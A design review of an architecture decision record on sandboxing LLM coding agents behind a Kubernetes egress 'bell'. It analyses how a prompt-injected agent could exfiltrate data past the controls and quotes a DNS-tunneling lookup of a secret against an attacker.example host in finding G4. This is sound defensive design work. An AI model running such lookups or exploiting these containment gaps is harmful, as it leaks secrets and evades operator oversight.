## Verdict

**Architecture sound; not yet acceptable as written.** ADR-0011's thesis — *hermeticity is enforced
by a network "bell" (engine + K8s NetworkPolicy), not by the tool-set; the tool-set is an orthogonal
capability axis* — **correctly resolves the most-consequential deferred gap** (ADR-0009 §3's
hermeticity mechanism + the per-tool boundary). The `ProbeNet` spike empirically grounds the move
(a Dagger container exec has outbound network by default; v0.21.8 exposes no per-exec no-network
flag), and the "bell" framing elegantly dissolves the per-tool-boundary question. The narrow re-open
of ADR-0008 (2-by-trust-zone, shared, per-Project isolation preserved) is defensible.

**However, the hermetic bell is operationally incomplete**, and the author's own flagged
derivations (§7/§8/§9/§5) carry real under-definition. Before promoting from PROPOSED, resolve:

- **G1** — hermetic base-image resolution (§4 "deny-all-except-provider" blocks registry pulls the
  hermetic Sandbox/checkable need).
- **G2** — cross-engine Workspace-Directory handoff (§7) is unspecified and the bell blocks the
  shared-cache path too.
- **G3** — §8's in-loop-vs-gate checkable split contradicts CONTEXT.md's "the checkable is reused
  in both."
- **G4** — DNS-exfiltration blind spot in "deny-all-except-provider."
- **F1, F2** — factual ("committed") + ADR-0009 §3 lead-sentence contradiction.

**Recommendation:** accept the architecture in principle; gate promotion on G1–G4 + F1–F2.

## Coherence checks (the requested verifications)

### C-1. Does §3's revision of ADR-0009 §3 resolve its flagged gap? — **YES, but see F2.**

ADR-0009 §3 flagged a `[GAP]`: it asserted the mechanism *class* (tool-set exclusion) but left the
resolved per-tool boundary **and** "whether hermeticity is additionally enforced by a Sandbox-pod
NetworkPolicy" to this ADR. ADR-0011 §3 **resolves both**: hermeticity is enforced *solely* by the
bell; the tool-set is demoted to an orthogonal capability axis. This is a coherent, stronger
resolution than ADR-0009 §3's GAP anticipated (it expected a NetworkPolicy *addition*; ADR-0011 makes
it the *only* mechanism). Consistent with the CONTEXT.md `Tool` glossary (tool-set = "what an agent
may call," capability, not security). **Verdict: resolves the gap.** Modulo **F2** (the ADR-0009 §3
lead sentence still asserts the old mechanism and must be amended in-place).

### C-2. Is the narrow re-open of ADR-0008 (2 by trust-zone) sound, and does it preserve per-Project isolation? — **YES, with ripples (H1/H2/G5).**

2 shared cluster-level engines is the minimal re-open (not N-per-Project); ADR-0008's rejection of
per-Project engines stands. Per-Project isolation (namespace + SA/`pods/exec` RBAC + cache-vol names)
is genuinely orthogonal and preserved. The hermetic bell's deny-all *strengthens* cross-Project
isolation for the cognitive zone (no exfil path even on session-isolation failure). **Sound.**
Ripples the ADR under-documents: stale "singleton" statements (H1), doubled RBAC surface (H2), and
the kube-pod:// control-channel assumption (G5).

### C-3. Does §4's provider-allowlist hold against the prompt-injection→exfiltration threat? — **Principle YES; completeness NO (G1/G4/G6).**

Pinning the cognition provider as controller-set/engine-side is correct: an injected agent cannot
redirect cognition to an attacker endpoint, and exfil-to-attacker-endpoint is blocked. Residual
exfil-via-the-trusted-provider is the inherent, accepted cognition-channel risk. **But** the
"deny-all-except-provider" formulation is operationally incomplete: it omits base-image resolution
(G1), DNS exfiltration (G4), and leaves per-Run-vs-per-engine provider granularity ambiguous (G6).

### C-4. Do §7/§8/§9 (the flagged derivations) hold? — **PARTIALLY: G2 (§7) and G3 (§8) are under-defined; §9 holds with H3.**

- **§7 (bootstrap→LLM Directory handoff):** under-defined — see **G2**. The handoff crosses engines
  (networked→hermetic); the bell blocks the shared S3/GCS cache path; the mechanism is unspecified.
- **§8 (in-loop checkable hermetic-tolerance):** coherent *intent*, but contradicts CONTEXT.md's
  "reused" checkable — see **G3**.
- **§9 (os-eco read-local / sync-networked):** **holds.** Read-local under the hermetic bell,
  write-back/sync networked outside the loop, is consistent with the bell principle and ADR-0007's
  namespace boundary. Minor: the networked sync step is absent from §6's routing table (**H3**).

### C-5. Is the ProbeNet spike sound as evidence? — **Sound but partial (H6); factual error F1.**

ProbeNet proves a `dag.Container().From().WithExec()` has outbound network by default (`NET_OK`),
which is sufficient to refute "tool-set exclusion alone guarantees hermeticity" *for the
container-exec path*. The broader claim ("any exec path … regardless of which `dag.*` tools are on
its `Env`") additionally leans on the **in-loop checkable** being such a path (it executes
agent-authored Workspace content). That bridge is logical but ProbeNet did not exercise the checkable
path directly (**H6**). The spike is well-built (robust to wget failure via captured exit code;
LLM-free). Factual defect: the ADR calls it "committed" — it is not (**F1**).

## Findings

### G1. `[GAP]` (high) — hermetic base-image resolution is unaddressed (§4 vs §5)

**Where:** §4 ("deny-all-except-the-pinned-cognition-provider"); §5 (registries placed in the
*networked* allowlist only); Consequences "Deferred … exact NetworkPolicy manifests (allowlist
contents)."

**Issue:** `engine-hermetic`'s egress is "deny **all** except the pinned LLM-provider endpoint(s)."
But the hermetic coder Run still needs container base images — `dag.Container().From(...)` for the
Sandbox and the in-loop checkable (the project dev/build image, or even `alpine`). Dagger resolves
images **engine-side** as pod egress to a registry. A provider-only allowlist blocks that pull, so
the hermetic workload cannot start. §5 explicitly confines registries to `engine-networked`, so there
is no hermetic path to an image. §7's "deps are pre-installed" addresses *dependencies*, not *base
images*.

**Why it matters:** as literally specified, the hermetic bell is operationally non-viable — no
hermetic Run can obtain its image. This is the single biggest threat to §4's coherence/sufficiency.

**Suggested resolution (pick one, state it):** (a) pre-stage/cache base images into `engine-hermetic`
during controller provisioning (from a networked context); (b) add an *internal* registry mirror to
the hermetic allowlist (narrowing "provider only" — restate §4 as "deny-all except provider + pinned
internal registry"); or (c) have the controller load the image as a tar/local artifact into the
hermetic session (no egress). Fold the choice into the "Deferred" allowlist-contents item, but make
the *category* (image resolution) explicit — it is not optional.

### G2. `[GAP]` (high) — cross-engine Workspace-Directory handoff is unspecified (§7)

**Where:** §7 ("emits it as a `Directory` artifact … consumes it via Workspace lineage").

**Issue:** `dagmar-bootstrap` (networked) prepares the Workspace and the coder (hermetic) consumes
it — these are **different engine pods** with separate caches. A Dagger `Directory` does not
auto-transfer between engines; the coder→gate→review flow crosses the trust-zone boundary
*repeatedly*. The handoff mechanism is unspecified, and §7 points at "Workspace lineage (CONTEXT.md)"
which is itself **deferred** (ADR-0008 §5 / CONTEXT.md "Open questions") and was framed for a
single engine. Worse, the hermetic bell's deny-all also blocks the obvious shared path —
ADR-0004's "optional S3/GCS" cache — so the Directory cannot ride a shared object store either.

**Why it matters:** §7 is one of the author's flagged derivations, and it is the weakest. Without a
specified mechanism, the bootstrap→coder→gate→review chain has no defined data path across
trust-zones.

**Suggested resolution:** state that the controller brokers the transfer locally (export from the
networked engine → controller → import/mount into the hermetic engine as a Directory input, no
network egress), OR define a shared in-cluster artifact store reachable by both bells (and add it to
both allowlists). Make explicit that this is a new cross-engine dimension on top of the still-open
Workspace-lineage question.

### G3. `[GAP]` (high) — §8 in-loop-vs-gate checkable split contradicts CONTEXT.md "reused"

**Where:** §8 ("the in-loop checkable must be hermetic-tolerant … the gate's checkable may use
network … confine network use to the gate"); CONTEXT.md `checkable` glossary ("reused both in-loop …
and as the mechanical layer of the QualityGate").

**Issue:** CONTEXT.md defines **one** checkable, reused in both places. §8 implies the in-loop and
gate instances can differ in network need ("confine network use to the gate"). If the *same*
checkable needs network (e.g. `go test`/`npm` resolution), it runs under the networked gate but
**fails** under the hermetic in-loop bell — it cannot be "reused" identically. Conversely, if it must
be hermetic-tolerant everywhere, then §8's "the gate's checkable may use network" is moot *for that
reused checkable*.

**Why it matters:** §8 is a flagged derivation and it directly tensions with the pinned ubiquitous
language. Either the checkable model or §8 must give.

**Suggested resolution:** pick one and align both docs: (a) the checkable must be
hermetic-tolerant everywhere (then the gate's network allowance applies only to *additional*
networked gate steps, not the reused checkable) and update §8's wording; or (b) allow distinct
in-loop vs gate checkables and update CONTEXT.md's "reused" claim. (a) is the smaller change.

### G4. `[GAP]` (high) — DNS-exfiltration blind spot in "deny-all-except-provider" (§4)

**Where:** §4.

**Issue:** K8s `NetworkPolicy` is L3/L4 (IP/port) and conventionally does **not** block a pod's DNS
to the cluster resolver (CoreDNS), which then forwards upstream. Under "deny-all-except-provider" an
injected agent could still exfiltrate via DNS tunneling (e.g. `getent hosts
<secret>.attacker.example`, or a crafted lookup in the build/test step). This is exactly the
prompt-injection→exfiltration threat §4 claims to neutralize, and it is the classic NetworkPolicy
blind spot.

**Why it matters:** "deny-all-except-provider" is stated as *sufficient*; against DNS exfil it is
not, unless DNS egress is also controlled.

**Suggested resolution:** state the DNS handling explicitly — e.g. block pod egress DNS and resolve
the provider via a pinned IP / `/etc/hosts` projection, or constrain CoreDNS upstream for the
engine-hermetic namespace. Add to the §4 allowlist contract.

### G5. `[GAP]` (medium) — kube-pod:// control channel vs the egress NetworkPolicy (§4/§6)

**Where:** §4, §6 (mermaid: agent pod `kube-pod://` → engine).

**Issue:** The agent pod reaches the engine via `_EXPERIMENTAL_DAGGER_RUNNER_HOST=kube-pod://`,
i.e. API-server `pods/exec` traffic (tunneled), not pod-to-pod networking. An egress NetworkPolicy
on the engine pod governs the pod's own outbound traffic and should not sever the API-server-tunneled
control/data channel — but the ADR never states this assumption. A naive reader (or implementer)
could fear the bell breaks `kube-pod://`, or could mis-scope the policy and break it.

**Why it matters:** correctness/implementation clarity for the central control path.

**Suggested resolution:** add one sentence: the NetworkPolicy scopes *workload egress* only; the
`kube-pod://`/`pods/exec` control channel is API-server traffic and is unaffected (and is itself
gated by the per-Project `pods/exec` RBAC, ADR-0008 §2).

### G6. `[GAP]` (low) — provider-allowlist granularity ambiguous (§4)

**Where:** §4 ("the pinned LLM-provider endpoint(s) … set by the controller (a Run binding / engine
config)").

**Issue:** Unclear whether the provider is pinned **per-Run** (each Project's own provider) or
**per-engine** (one provider for all Projects sharing `engine-hermetic`). Multi-provider tenancy
(Project A → Anthropic, Project B → OpenAI) requires either per-Run pinning or a union allowlist.

**Why it matters:** if per-engine/union, the exfil surface is the union of all trusted providers
(still trusted, so accepted), but the model should be explicit; per-Run is cleaner.

**Suggested resolution:** state "per-Run provider pinning (Run binding); the engine NetworkPolicy
allows the union of all pinned trusted providers."

### F1. `[FIX]` (low) — ADR says ProbeNet is "committed"; it is uncommitted

**Where:** §Context ("`ProbeNet` spike, committed in `.dagger/main.go`"); Consequences ("`ProbeNet`
(`.dagger/main.go`, committed)").

**Issue:** `git status` shows `.dagger/main.go` as **modified, uncommitted** (` M`). This entire
review is of *uncommitted* working-tree changes. The "committed" claim is false.

**Suggested resolution:** either commit the spike, or correct both mentions to "uncommitted spike
(in the working tree under review)."

### F2. `[FIX]` (medium) — ADR-0009 §3 lead sentence now contradicts ADR-0011 §3

**Where:** ADR-0009 §3 ("This is enforced through the **tool-set**") vs ADR-0011 §3 ("enforced
**solely** at this network layer … revises ADR-0009 §3").

**Issue:** ADR-0009 §3's GAP-pointer anticipates a NetworkPolicy *addition*, but its **lead
sentence** asserts the tool-set as *the* enforcement mechanism — which ADR-0011 §3 reverses (tool-set
is no longer a network-security mechanism at all). A reader of ADR-0009 §3 in isolation still gets
the wrong (now-retracted) mechanism.

**Suggested resolution:** amend ADR-0009 §3 in-place — reword the lead to "enforced by the bell
(see ADR-0011 §3); the tool-set reflects capability, not network enforcement," and mark the prior
"via the tool-set" framing superseded. (Mirror how ADR-0008 §4 retracted its own earlier wording for
A1.)

### H1. `[HOUSE]` (medium) — "singleton engine" statements go stale (CONTEXT.md, ADR-0008, ADR-0004)

**Where:** `CONTEXT.md:36` (Tier-A `Engine`: "a singleton engine serves all Projects"); `CONTEXT.md:214`
(ADR-0008 entry "singleton engine"); ADR-0008 Consequences ("the in-cluster engine is
**singleton**"); ADR-0004 Consequences (engine tenancy open sub-question).

**Issue:** Once ADR-0011 lands, the engine is **2-by-trust-zone**, not singleton. ADR-0011
Consequences lists glossary updates for `Sandbox` (gains trust-zone) and `Tool`, but **misses** the
`Engine` cardinality note and the ADR-0008/0004 ripple. A reader hitting CONTEXT.md:36 gets a
now-false statement.

**Suggested resolution:** add to ADR-0011 Consequences: update CONTEXT.md:36 Engine parenthetical
("2 cluster-level engines by trust-zone, shared across Projects") + CONTEXT.md:214 ADR-0008 line;
add a forward-pointer in ADR-0008 (and note ADR-0004's open sub-question is now re-resolved).

### H2. `[HOUSE]` (low) — RBAC provisioning surface doubles with 2 engines

**Where:** §6 (mermaid: controller provisions "SA + RBAC" per Run); ADR-0008 §2/Operations (one
`pods/exec` RoleBinding per Project).

**Issue:** With 2 shared engines, each Project's SA needs `pods/exec` on the **correct** engine pod
per Run (hermetic vs networked) — the controller grants per-Run. ADR-0008 §2 assumed a single engine
pod. ADR-0011 §6's mermaid shows per-Run SA+RBAC but the Consequences don't call out the doubled
RBAC surface.

**Suggested resolution:** note in Consequences that the per-Project `pods/exec` RBAC now targets
either engine pod (controller-selectable per Run), and the multi-engine cache-vol naming (already
deferred) accompanies it.

### H3. `[HOUSE]` (low) — §9 os-eco sync step is absent from the §6 routing table

**Where:** §6 (routing table: bootstrap/coder/gate/review) vs §9 ("write-back/sync … happens outside
the hermetic loop (controller, or a dedicated networked sync step)").

**Issue:** §9 introduces a networked write-back/sync step (mulch/seeds push to remotes) not present
in §6's routing table. In-loop os-eco ops must be read/record-only (local); `ml sync`/`sd sync`
(networked) belong to that step.

**Suggested resolution:** add the sync step to §6's routing table (`engine-networked`), or state it
is controller-side and therefore outside the workflow-step table.

### H4. `[HOUSE]` (low) — network-capable tools will fail at runtime under the hermetic bell

**Where:** §2 ("no tools are withheld … a network-capable tool under the hermetic bell is simply
blocked at the bell").

**Issue:** Security holds (the bell blocks egress), but operationally a hermetic coder whose
role-based tool-set includes a network-capable tool (`http`, networked `container`/`git`) will see
those calls fail at the bell — possible Loop friction (an injected agent retrying). Not a defect,
but an unstated UX/loop-efficiency consequence.

**Suggested resolution:** either note in tool-rules/prompt-mixin that network tools are no-ops under
the hermetic bell, or concede that the capability axis *may* still drop pure-network tools from
hermetic agents' tool-sets for loop-efficiency (without that being a security mechanism). Clarify
that the bell blocks *network*, not the tool invocation itself (local `container.WithExec` still
works).

### H5. `[HOUSE]` (low) — shared `engine-hermetic` is a shared-fate blast radius

**Where:** §1/§6 (engines "shared across all Projects").

**Issue:** All Projects' cognitive Runs share one `engine-hermetic` pod; compromise of that pod
exposes every Project's cognition channel (to the provider) and sessions. Defense-in-depth holds
(per-session isolation + deny-all-exfil), but the shared-fate ops consideration is unstated.

**Suggested resolution:** note in Consequences/Ops as an accepted trade-off (mirrors ADR-0008's
shared-singleton rationale), with the deny-all-except-provider bell as the cross-Project containment.

### H6. `[HOUSE]` (low) — ProbeNet grounds the container-exec path only

**Where:** §Context ("an injected agent with any exec path (LLM-loop container, in-loop checkable)
can exfiltrate"); ProbeNet (`.dagger/main.go`).

**Issue:** ProbeNet exercised a bare `container.WithExec` (`NET_OK`). The ADR's broader claim
additionally rests on the **in-loop checkable** being an exec path the LLM drives regardless of
tool-set (it runs agent-authored Workspace content). That bridge is logical, but ProbeNet did not
test the checkable path, so the evidence is partial.

**Suggested resolution:** either extend the spike to run a manifest checkable and observe the same
`NET_OK`, or make the bridge explicit in prose: "the in-loop checkable is itself a container exec
(the same mechanism ProbeNet exercised), and it runs agent-authored Workspace content."
